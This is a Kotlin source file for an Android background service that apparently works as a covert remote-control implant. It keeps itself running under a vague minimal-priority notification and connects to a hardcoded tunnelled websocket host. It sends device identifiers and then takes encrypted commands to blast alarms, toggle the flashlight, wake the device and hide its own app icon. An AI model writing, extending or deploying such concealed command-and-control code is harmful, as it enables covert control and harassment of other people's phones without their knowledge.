package com.hugecode.buffer

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraManager
import android.media.AudioAttributes
import android.media.AudioManager
import android.media.ToneGenerator
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.os.VibrationEffect
import android.os.Vibrator
import android.provider.Settings
import kotlinx.coroutines.*
import org.java_websocket.client.WebSocketClient
import org.java_websocket.handshake.ServerHandshake
import org.json.JSONObject
import java.net.URI
import java.security.MessageDigest
import java.security.KeyFactory
import java.security.spec.X509EncodedKeySpec
import java.util.Base64
import javax.net.ssl.SSLContext

class DeviceService : Service() {
    private var webSocket: WebSocketClient? = null
    private var toneGenerator: ToneGenerator? = null
    private var audioManager: AudioManager? = null
    private var vibrator: Vibrator? = null
    private var cameraManager: CameraManager? = null
    private var cameraId: String? = null
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var isConnected = false
    private var originalVolume = 0
    
    private var sharedKey: ByteArray? = null
    private var myKeyPair: java.security.KeyPair? = null
    private var myIdentityKeyPair: java.security.KeyPair? = null
    private var sslContext: SSLContext? = null
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onCreate() {
        super.onCreate()
        StorageManager.init(this)
        SecurityManager.init(this)
        
        startForegroundService()
        audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
        cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        
        sslContext = CertificatePinner.createSSLContext()
        generateKeyPairs()
        connectToServer()
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        return START_STICKY
    }
    
    private fun startForegroundService() {
        val channelId = "local_system"
        val channel = NotificationChannel(channelId, "System", NotificationManager.IMPORTANCE_MIN)
        val notificationManager = getSystemService(NotificationManager::class.java)
        notificationManager.createNotificationChannel(channel)
        
        val notification = Notification.Builder(this, channelId)
            .setContentTitle("Id_Terrible")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.ic_media_play)
            .build()
        
        startForeground(1, notification)
    }
    
    private fun generateKeyPairs() {
        myKeyPair = CryptoManager.generateKeyPair()
        myIdentityKeyPair = CryptoManager.generateKeyPair()
    }
    
    private fun connectToServer() {
        if (isConnected) return
        
        val ws = object : WebSocketClient(URI("wss://f29ac671fe71aas174.serveousercontent.com")) {
            
            override fun onOpen(handshakedata: ServerHandshake?) {
                isConnected = true
                
                val publicKeys = JSONObject().apply {
                    put("type", "keyExchange")
                    put("publicKey", Base64.getEncoder().encodeToString(myKeyPair?.public?.encoded))
                    put("identityKey", Base64.getEncoder().encodeToString(myIdentityKeyPair?.public?.encoded))
                }
                send(publicKeys.toString())
            }
            
            override fun onMessage(message: String?) {
                message?.let { handleMessage(it) }
            }
            
            override fun onClose(code: Int, reason: String?, remote: Boolean) {
                isConnected = false
                sharedKey = null
                sleepAndReconnect()
            }
            
            override fun onError(ex: Exception?) {
                isConnected = false
                sharedKey = null
                sleepAndReconnect()
            }
        }
        
        sslContext?.let { context ->
            ws.setSocketFactory(context.socketFactory)
        }
        
        webSocket = ws
        ws.connect()
    }
    
    private fun handleMessage(message: String) {
        try {
            val json = JSONObject(message)
            
            when (json.getString("type")) {
                "keyExchange" -> handleKeyExchange(json)
                "encrypted" -> handleEncryptedMessage(json)
            }
        } catch (_: Exception) {}
    }
    
    private fun handleKeyExchange(json: JSONObject) {
        try {
            val theirPublicKeyBytes = Base64.getDecoder().decode(json.getString("publicKey"))
            val theirIdentityKeyBytes = Base64.getDecoder().decode(json.getString("identityKey"))
            
            val keyFactory = KeyFactory.getInstance("X25519")
            val theirPublicKey = keyFactory.generatePublic(X509EncodedKeySpec(theirPublicKeyBytes))
            val theirIdentityKey = keyFactory.generatePublic(X509EncodedKeySpec(theirIdentityKeyBytes))
            
            sharedKey = CryptoManager.x3dh(
                myKeyPair!!.private,
                myKeyPair!!.public,
                theirPublicKey,
                theirIdentityKey,
                myIdentityKeyPair!!.private
            )
            
            sendDeviceInfo()
        } catch (_: Exception) {}
    }
    
    private fun handleEncryptedMessage(json: JSONObject) {
        try {
            val encryptedData = json.getString("data")
            val decrypted = CryptoManager.decryptAES(encryptedData, sharedKey!!)
            
            val command = JSONObject(decrypted)
            handleCommand(command)
        } catch (_: Exception) {}
    }
    
    private fun sendDeviceInfo() {
        val deviceId = getAndroidDeviceId()
        val deviceHash = getDeviceHash(deviceId)
        val deviceName = getDeviceName()
        
        val info = JSONObject().apply {
            put("type", "deviceInfo")
            put("name", deviceName)
            put("hash", deviceHash)
            put("volume", getCurrentVolume())
        }
        
        sendEncrypted(info)
    }
    
    private fun sendEncrypted(data: JSONObject) {
        if (sharedKey == null) return
        
        val encrypted = CryptoManager.encryptAES(data.toString(), sharedKey!!)
        val message = JSONObject().apply {
            put("type", "encrypted")
            put("data", encrypted)
        }
        
        webSocket?.send(message.toString())
    }
    
    private fun handleCommand(json: JSONObject) {
        try {
            when (json.getString("type")) {
                "setVolume" -> setVolume(json.getInt("value"))
                "alarm" -> {
                    if (json.getString("action") == "start") playAlarm()
                    else stopAlarm()
                }
                "lockScreen" -> lockScreen()
                "wakeDevice" -> wakeDevice()
                "flashlight" -> {
                    if (json.getString("action") == "on") flashlightOn()
                    else flashlightOff()
                }
                "hideIcon" -> hideAppIcon()
                "showIcon" -> showAppIcon()
            }
        } catch (_: Exception) {}
    }
    
    private fun hideAppIcon() {
        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (_: Exception) {}
    }
    
    private fun showAppIcon() {
        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (_: Exception) {}
    }
    
    private fun setVolume(value: Int) {
        val maxVolume = audioManager?.getStreamMaxVolume(AudioManager.STREAM_MUSIC) ?: 15
        val volume = (value * maxVolume) / 100
        audioManager?.setStreamVolume(AudioManager.STREAM_MUSIC, volume, 0)
    }
    
    private fun getCurrentVolume(): Int {
        val maxVolume = audioManager?.getStreamMaxVolume(AudioManager.STREAM_MUSIC) ?: 15
        val currentVolume = audioManager?.getStreamVolume(AudioManager.STREAM_MUSIC) ?: 0
        return (currentVolume * 100) / maxVolume
    }
    
    private fun playAlarm() {
        stopAlarm()
        
        originalVolume = audioManager?.getStreamVolume(AudioManager.STREAM_MUSIC) ?: 0
        val maxVolume = audioManager?.getStreamMaxVolume(AudioManager.STREAM_MUSIC) ?: 15
        audioManager?.setStreamVolume(AudioManager.STREAM_MUSIC, maxVolume, 0)
        
        serviceScope.launch {
            repeat(10) {
                toneGenerator = ToneGenerator(AudioManager.STREAM_MUSIC, 100)
                toneGenerator?.startTone(ToneGenerator.TONE_SUP_ERROR, 150)
                vibrator?.vibrate(VibrationEffect.createOneShot(150, VibrationEffect.DEFAULT_AMPLITUDE))
                delay(200)
                toneGenerator?.stopTone()
                toneGenerator?.release()
                toneGenerator = null
            }
            audioManager?.setStreamVolume(AudioManager.STREAM_MUSIC, originalVolume, 0)
        }
    }
    
    private fun stopAlarm() {
        toneGenerator?.stopTone()
        toneGenerator?.release()
        toneGenerator = null
        vibrator?.cancel()
        audioManager?.setStreamVolume(AudioManager.STREAM_MUSIC, originalVolume, 0)
    }
    
    private fun lockScreen() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (powerManager.isInteractive) {
                sendBroadcast(Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS))
            }
        } catch (_: Exception) {}
    }
    
    private fun wakeDevice() {
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        val wakeLock = powerManager.newWakeLock(
            PowerManager.FULL_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP,
            "Id_Terrible:WakeLock"
        )
        wakeLock.acquire(5000)
        wakeLock.release()
    }
    
    private fun flashlightOn() {
        try {
            cameraId = cameraManager?.cameraIdList?.firstOrNull()
            cameraId?.let { id -> cameraManager?.setTorchMode(id, true) }
        } catch (_: CameraAccessException) {}
    }
    
    private fun flashlightOff() {
        try {
            cameraId?.let { id -> cameraManager?.setTorchMode(id, false) }
        } catch (_: CameraAccessException) {}
    }
    
    private fun sleepAndReconnect() {
        serviceScope.launch {
            delay(10000)
            generateKeyPairs()
            connectToServer()
        }
    }
    
    private fun getAndroidDeviceId(): String {
        return Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
    }
    
    private fun getDeviceHash(id: String): String {
        val digest = MessageDigest.getInstance("SHA-256")
        return digest.digest(id.toByteArray()).joinToString("") { "%02x".format(it) }.substring(0, 16)
    }
    
    private fun getDeviceName(): String {
        return "${Build.MANUFACTURER} ${Build.MODEL}"
    }
    
    override fun onDestroy() {
        super.onDestroy()
        webSocket?.close()
        serviceScope.cancel()
    }
}
